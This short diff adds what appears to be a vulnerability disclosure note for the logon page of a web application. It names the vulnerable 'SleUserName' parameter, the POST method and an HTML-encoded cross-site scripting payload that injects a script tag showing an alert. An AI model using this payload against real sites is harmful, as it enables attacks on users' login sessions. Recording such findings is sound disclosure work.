@@ -1,0 +1,7 @@
+The identified parameter is: &quot;SleUserName&quot;
+
+URL: https://www.somesite.es/cezanneweb/CFLogon/CFLogon.asp
+    (Use a Proprietary Account)
+
+HTTP METHOD:POST
+STRING:&#039;)&quot;&gt;&lt;script&gt;alert(&quot;S21sec&quot;)&lt;/script&gt;
